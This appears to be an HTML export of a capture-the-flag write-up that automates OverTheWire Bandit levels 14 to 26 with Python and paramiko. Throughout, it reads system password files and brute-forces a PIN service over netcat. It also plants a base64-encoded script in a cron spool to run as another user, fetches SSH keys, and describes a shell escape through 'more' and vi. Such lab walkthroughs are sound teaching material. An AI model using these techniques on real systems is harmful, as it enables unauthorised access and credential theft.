+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd5e64e2" class="outline-2">
+<h2 id="orgd5e64e2">Bandit14 =&gt; Bandit15</h2>
+<div class="outline-text-2" id="text-orgd5e64e2">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit14</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit14"</span>)
+    connect(<span style="color: #98be65;">'bandit14'</span>)
+
+    <span style="color: #dcaeea;">bandit14_pass_file</span> = <span style="color: #98be65;">'/etc/bandit_pass/bandit14'</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat '</span> + bandit14_pass_file)
+
+    <span style="color: #dcaeea;">bandit14_creds</span> = credentials[<span style="color: #98be65;">'bandit14'</span>]
+
+    <span style="color: #dcaeea;">passwd</span> = out.read().decode().strip()
+    <span style="color: #51afef;">if</span> (<span style="color: #c678dd;">len</span>(bandit14_creds) == <span style="color: #da8548; font-weight: bold;">1</span>):
+        bandit14_creds.append(passwd)
+    <span style="color: #51afef;">else</span>:
+        <span style="color: #dcaeea;">bandit14_creds</span>[<span style="color: #da8548; font-weight: bold;">1</span>] = passwd
+
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(F<span style="color: #98be65;">'nc localhost 30000 &lt; {bandit14_pass_file} | xargs | cut -d " " -f2'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit15'</span>] = out.read().decode().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgb67d0ed" class="outline-2">
+<h2 id="orgb67d0ed">Bandit15 =&gt; Bandit16</h2>
+<div class="outline-text-2" id="text-orgb67d0ed">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit15</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit15"</span>)
+    connect(<span style="color: #98be65;">'bandit15'</span>)
+
+    <span style="color: #dcaeea;">stdin</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">err</span> = ssh.exec_command(<span style="color: #98be65;">'ncat -v --ssl localhost 30001'</span>)
+
+    <span style="color: #51afef;">print</span>(err.readline())
+    <span style="color: #51afef;">print</span>(err.readline())
+    <span style="color: #51afef;">print</span>(err.readline())
+    <span style="color: #51afef;">print</span>(err.readline())
+    <span style="color: #51afef;">print</span>(err.readline())
+    <span style="color: #51afef;">print</span>(err.readline())
+
+    stdin.write(F<span style="color: #98be65;">"{credentials['bandit15']}\n"</span>)
+    out.readline()
+    <span style="color: #dcaeea;">passwd</span> = out.readline().strip()
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit16'</span>] = passwd
+
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5284704" class="outline-2">
+<h2 id="org5284704">Bandit16 =&gt; Bandit17</h2>
+<div class="outline-text-2" id="text-org5284704">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit16</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit16"</span>)
+    connect(<span style="color: #98be65;">'bandit16'</span>)
+
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'nmap -p 31000-32000 localhost'</span>)
+
+    <span style="color: #dcaeea;">nmap_scan</span> = out.read().decode()
+    <span style="color: #dcaeea;">ports</span> = re.findall(r<span style="color: #98be65;">'^[0-9]{5}'</span>, nmap_scan, re.MULTILINE)
+
+    <span style="color: #51afef;">for</span> port <span style="color: #51afef;">in</span> ports:
+        <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(F<span style="color: #98be65;">'cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:{port} -quiet 2&gt;/dev/null'</span>)
+        <span style="color: #dcaeea;">response_header</span> = out.readline()
+        <span style="color: #51afef;">if</span> <span style="color: #98be65;">"Correct"</span> <span style="color: #51afef;">in</span> response_header:
+            <span style="color: #dcaeea;">rsa_key</span> = out.read().decode()
+            <span style="color: #51afef;">break</span>
+
+    <span style="color: #51afef;">try</span>:
+        os.mkdir(<span style="color: #98be65;">'working/bandit16'</span>)
+    <span style="color: #51afef;">except</span>:
+        <span style="color: #51afef;">pass</span>
+
+    <span style="color: #dcaeea;">file_path</span> = <span style="color: #98be65;">'working/bandit16/bandit17_id_rsa'</span>
+    <span style="color: #51afef;">with</span> <span style="color: #c678dd;">open</span>(file_path, <span style="color: #98be65;">'w'</span>) <span style="color: #51afef;">as</span> f:
+        f.write(rsa_key)
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit17'</span>] = [os.getcwd() + <span style="color: #98be65;">"/"</span> + file_path]
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge752a0e" class="outline-2">
+<h2 id="orge752a0e">Bandit17 =&gt; Bandit18</h2>
+<div class="outline-text-2" id="text-orge752a0e">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit17</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit17"</span>)
+    connect(<span style="color: #98be65;">'bandit17'</span>)
+
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /etc/bandit_pass/bandit17'</span>)
+    <span style="color: #dcaeea;">creds</span> = credentials[<span style="color: #98be65;">'bandit17'</span>]
+    <span style="color: #dcaeea;">passwd</span> = out.readline().strip()
+    <span style="color: #51afef;">if</span> <span style="color: #c678dd;">len</span>(creds) == <span style="color: #da8548; font-weight: bold;">1</span>:
+        creds.append(passwd)
+    <span style="color: #51afef;">else</span>:
+        <span style="color: #dcaeea;">creds</span>[<span style="color: #da8548; font-weight: bold;">1</span>] = passwd
+
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'diff passwords.new passwords.old'</span>)
+    <span style="color: #dcaeea;">passwd</span> = re.findall(r<span style="color: #98be65;">'&lt; .*$'</span>, out.read().decode(), re.MULTILINE)[<span style="color: #da8548; font-weight: bold;">0</span>][<span style="color: #da8548; font-weight: bold;">2</span>:]
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit18'</span>] = passwd
+
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd2f6d95" class="outline-2">
+<h2 id="orgd2f6d95">Bandit18 =&gt; Bandit19</h2>
+<div class="outline-text-2" id="text-orgd2f6d95">
+<p>
+Trying to log in with the normal <code>ssh</code> command will kick us out but with paramiko it&rsquo;s pretty simple.
+</p>
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit18</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit18"</span>)
+    connect(<span style="color: #98be65;">'bandit18'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat readme'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit19'</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+
+<p>
+The normal way would be to use the command: <code>ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"</code>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org3d1f585" class="outline-2">
+<h2 id="org3d1f585">Bandit19 =&gt; Bandit20</h2>
+<div class="outline-text-2" id="text-org3d1f585">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit19</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit19"</span>)
+    connect(<span style="color: #98be65;">'bandit19'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'./bandit20-do cat /etc/bandit_pass/bandit20'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit20'</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org1e1692d" class="outline-2">
+<h2 id="org1e1692d">Bandit20 =&gt; Bandit21</h2>
+<div class="outline-text-2" id="text-org1e1692d">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit20</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit20"</span>)
+    connect(<span style="color: #98be65;">'bandit20'</span>)
+    <span style="color: #dcaeea;">port</span> = <span style="color: #da8548; font-weight: bold;">4444</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(f<span style="color: #98be65;">'nc -lnvp {port} &lt; /etc/bandit_pass/bandit20 &amp; sleep 2 &amp;&amp; ./suconnect {port}'</span>)
+    <span style="color: #dcaeea;">passwd</span> = [x.strip() <span style="color: #51afef;">for</span> x <span style="color: #51afef;">in</span> out.readlines() <span style="color: #51afef;">if</span> <span style="color: #c678dd;">len</span>(x) == <span style="color: #da8548; font-weight: bold;">33</span>][<span style="color: #da8548; font-weight: bold;">0</span>]
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit21'</span>] = passwd
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgee83274" class="outline-2">
+<h2 id="orgee83274">Bandit21 =&gt; Bandit22</h2>
+<div class="outline-text-2" id="text-orgee83274">
+<p>
+The cronjob script is catting the bandit22 password file into a file in the /tmp folder every minute
+</p>
+<div class="org-src-container">
+<pre class="src src-python">connect(<span style="color: #98be65;">'bandit21'</span>)
+<span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /etc/cron.d/cronjob_bandit22'</span>)
+out.read().decode()
+</pre>
+</div>
+
+<pre class="example">
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+</pre>
+
+
+<div class="org-src-container">
+<pre class="src src-python">connect(<span style="color: #98be65;">'bandit21'</span>)
+<span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /usr/bin/cronjob_bandit22.sh'</span>)
+out.read().decode()
+</pre>
+</div>
+
+<pre class="example">
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+</pre>
+
+
+<p>
+All we have to do is read that file
+</p>
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit21</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit21"</span>)
+    connect(<span style="color: #98be65;">'bandit21'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit22'</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org751074e" class="outline-2">
+<h2 id="org751074e">Bandit22 =&gt; Bandit23</h2>
+<div class="outline-text-2" id="text-org751074e">
+<p>
+Another cron script for us to look at and exploit
+</p>
+<div class="org-src-container">
+<pre class="src src-python">connect(<span style="color: #98be65;">'bandit22'</span>)
+<span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /etc/cron.d/cronjob_bandit23'</span>)
+out.read().decode()
+</pre>
+</div>
+
+<pre class="example">
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
+</pre>
+
+
+<div class="org-src-container">
+<pre class="src src-python">connect(<span style="color: #98be65;">'bandit22'</span>)
+<span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /usr/bin/cronjob_bandit23.sh'</span>)
+<span style="color: #83898d;">""</span>.join([x <span style="color: #51afef;">for</span> x <span style="color: #51afef;">in</span> out.readlines() <span style="color: #51afef;">if</span> x.strip() != <span style="color: #83898d;">""</span>])
+</pre>
+</div>
+
+<pre class="example">
+#!/bin/bash
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
+</pre>
+
+
+<p>
+Running this bash script with the <code>myname</code> variable set to bandit23, we see that the output of the password file is being written to another temp file like the previous challenge.
+</p>
+<div class="org-src-container">
+<pre class="src src-shell"><span style="color: #dcaeea;">myname</span>=<span style="color: #98be65;">'bandit23'</span>
+<span style="color: #dcaeea;">mytarget</span>=$<span style="color: #51afef;">(</span><span style="color: #ECBE7B;">echo</span> I am user $<span style="color: #dcaeea;">myname</span> | md5sum | cut -d <span style="color: #98be65;">' '</span> -f <span style="color: #da8548; font-weight: bold;">1</span><span style="color: #51afef;">)</span>
+<span style="color: #ECBE7B;">echo</span> <span style="color: #98be65;">"Copying passwordfile /etc/bandit_pass/</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">myname</span><span style="color: #98be65;"> to /tmp/</span><span style="color: #a9a1e1;">$</span><span style="color: #dcaeea;">mytarget</span><span style="color: #98be65;">"</span>
+</pre>
+</div>
+
+<pre class="example">
+Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349
+</pre>
+
+
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit22</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit22"</span>)
+    connect(<span style="color: #98be65;">'bandit22'</span>)
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /tmp/8ca319486bfbbc3663ea0fbe81326349'</span>)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit23'</span>] = out.readline().strip()
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org40ceacb" class="outline-2">
+<h2 id="org40ceacb">Bandit23 =&gt; Bandit24</h2>
+<div class="outline-text-2" id="text-org40ceacb">
+<p>
+More cron scripts! Except now we have to write our own
+</p>
+<div class="org-src-container">
+<pre class="src src-python">connect(<span style="color: #98be65;">'bandit23'</span>)
+<span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(<span style="color: #98be65;">'cat /usr/bin/cronjob_bandit24.sh'</span>)
+out.read().decode()
+</pre>
+</div>
+
+<pre class="example" id="org15c1747">
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+</pre>
+
+<p>
+This script executes all script files in \/var/spool/bandit24/
+Now we need to create our own script to be executed by the cronjob.
+We&rsquo;ll just use a simple script to read the password file and put it in a temp file that we can read
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit23</span>(show_progress=<span style="color: #a9a1e1;">True</span>):
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit23"</span>)
+    connect(<span style="color: #98be65;">'bandit23'</span>)
+    <span style="color: #dcaeea;">path</span> = make_work_dir() + <span style="color: #98be65;">"/24"</span>
+    <span style="color: #dcaeea;">script</span> = f<span style="color: #98be65;">"""cat /etc/bandit_pass/bandit24 &gt; {path}</span>
+<span style="color: #98be65;">    chmod +rw {path}"""</span>.encode()
+    <span style="color: #dcaeea;">encoded</span> = base64.b64encode(script).decode()
+    <span style="color: #dcaeea;">script_path</span> = <span style="color: #98be65;">'/var/spool/bandit24/jaydlc.sh'</span>
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Sending over script to run"</span>)
+    <span style="color: #dcaeea;">command</span> = F<span style="color: #98be65;">'echo {encoded} | base64 -d &gt; {script_path} &amp;&amp; chmod +x {script_path}'</span>
+    ssh.exec_command(command)
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Waiting for one minute before reading password file"</span>)
+    <span style="color: #dcaeea;">sleep_seconds</span> = <span style="color: #da8548; font-weight: bold;">60</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(f<span style="color: #98be65;">'sleep {sleep_seconds} &amp;&amp; cat {path}'</span>)
+    <span style="color: #51afef;">for</span> remaining <span style="color: #51afef;">in</span> <span style="color: #c678dd;">range</span>(sleep_seconds, <span style="color: #da8548; font-weight: bold;">0</span>, -<span style="color: #da8548; font-weight: bold;">1</span>):
+        <span style="color: #51afef;">if</span> show_progress:
+            sys.stdout.write(<span style="color: #98be65;">'\r'</span>)
+            sys.stdout.write(<span style="color: #98be65;">'{:2d} seconds remaining'</span>.<span style="color: #c678dd;">format</span>(remaining))
+            sys.stdout.flush()
+            time.sleep(<span style="color: #da8548; font-weight: bold;">1</span>)
+
+    <span style="color: #dcaeea;">passwd</span> = out.readline().strip()
+    <span style="color: #51afef;">if</span> show_progress:
+        sys.stdout.write(<span style="color: #98be65;">'\rRetrieved password! Password is '</span> + passwd)
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit24'</span>] = passwd
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgcc44857" class="outline-2">
+<h2 id="orgcc44857">Bandit24 =&gt; Bandit25</h2>
+<div class="outline-text-2" id="text-orgcc44857">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit24</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit24"</span>)
+    connect(<span style="color: #98be65;">'bandit24'</span>)
+
+    <span style="color: #dcaeea;">root</span> = os.getcwd()
+    <span style="color: #dcaeea;">cwd</span> = <span style="color: #98be65;">'working/bandit24'</span>
+    <span style="color: #51afef;">try</span>:
+        shutil.rmtree(cwd)
+    <span style="color: #51afef;">except</span>:
+        <span style="color: #51afef;">pass</span>
+
+    make_work_dir()
+    os.mkdir(cwd)
+    os.chdir(cwd)
+
+    <span style="color: #dcaeea;">combinations</span> = <span style="color: #98be65;">""</span>
+
+    <span style="color: #5B6268;"># </span><span style="color: #5B6268;">https://stackoverflow.com/questions/41642851/brute-force-using-python/41642913</span>
+    <span style="color: #dcaeea;">numbers</span> = <span style="color: #98be65;">'0123456789'</span>
+    <span style="color: #51afef;">for</span> c <span style="color: #51afef;">in</span> itertools.product(numbers, repeat=<span style="color: #da8548; font-weight: bold;">4</span>):
+        <span style="color: #dcaeea;">pin</span> = <span style="color: #98be65;">''</span>.join(c)
+        <span style="color: #dcaeea;">combinations</span> += F<span style="color: #98be65;">"{credentials['bandit24']} {pin}\n"</span>
+
+    <span style="color: #dcaeea;">file_name</span> = <span style="color: #98be65;">'combinations.txt'</span>
+    <span style="color: #51afef;">with</span> <span style="color: #c678dd;">open</span>(file_name, <span style="color: #98be65;">'w'</span>) <span style="color: #51afef;">as</span> f:
+        f.write(combinations)
+
+    <span style="color: #dcaeea;">sftp</span> = ssh.open_sftp()
+    <span style="color: #dcaeea;">remote_path</span> = <span style="color: #98be65;">'/tmp/jaydlc/combinations.txt'</span>
+    sftp.put(file_name, remote_path)
+    time.sleep(<span style="color: #da8548; font-weight: bold;">4</span>)
+
+    <span style="color: #dcaeea;">command</span> = F<span style="color: #98be65;">'cat {remote_path} | nc localhost 30002 | grep password | tail -n 1 | cut -d " " -f7'</span>
+    <span style="color: #dcaeea;">_</span>, <span style="color: #dcaeea;">out</span>, <span style="color: #dcaeea;">_</span> = ssh.exec_command(command)
+    <span style="color: #dcaeea;">passwd</span> = out.readline().strip()
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">'bandit25'</span>] = passwd
+    os.chdir(root)
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgbced051" class="outline-2">
+<h2 id="orgbced051">Bandit25 =&gt; Bandit26</h2>
+<div class="outline-text-2" id="text-orgbced051">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #51afef;">def</span> <span style="color: #c678dd;">bandit25</span>():
+    <span style="color: #51afef;">print</span>(<span style="color: #98be65;">"Pwning bandit25"</span>)
+    connect(<span style="color: #98be65;">'bandit25'</span>)
+
+    <span style="color: #dcaeea;">root</span> = os.getcwd()
+    <span style="color: #dcaeea;">cwd</span> = <span style="color: #98be65;">'working/bandit25'</span>
+    <span style="color: #51afef;">try</span>:
+        shutil.rmtree(cwd)
+    <span style="color: #51afef;">except</span>:
+        <span style="color: #51afef;">pass</span>
+
+    os.mkdir(cwd)
+    os.chdir(cwd)
+
+    <span style="color: #dcaeea;">sftp</span> = ssh.open_sftp()
+    sftp.get(<span style="color: #98be65;">'./bandit26.sshkey'</span>, <span style="color: #98be65;">'./bandit26_id_rsa'</span>)
+    sftp.close()
+
+    <span style="color: #dcaeea;">credentials</span>[<span style="color: #98be65;">"bandit26"</span>] = [os.getcwd() + <span style="color: #98be65;">'/bandit26_id_rsa'</span>]
+
+    os.chdir(root)
+    save()
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2e7c208" class="outline-2">
+<h2 id="org2e7c208">Bandit26 =&gt; Bandit27</h2>
+<div class="outline-text-2" id="text-org2e7c208">
+<p>
+Unfortunately, after getting the ssh key for bandit26, I have not figured out a way to automate the pwning of 27 due to bandit26&rsquo;s login shell being <code>more</code>.
+The manual way to do it is to make your terminal really small so that <code>more</code> enters command mode.
+In command mode, press <code>v</code> to open vi, enter <code>:set shell=/bin/bash</code> to override the shell environment variable, and then enter <code>:shell</code>.
+After the bash shell has spawned, enter the command <code>./bandit27-do cat /etc/bandit_pass/bandit27</code> and you should get the password for bandit27.
+</p>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="author">Author: CavemanJay</p>
+<p class="date">Created: 2021-04-24 Sat 18:53</p>
+</div>
+</body>
+</html>
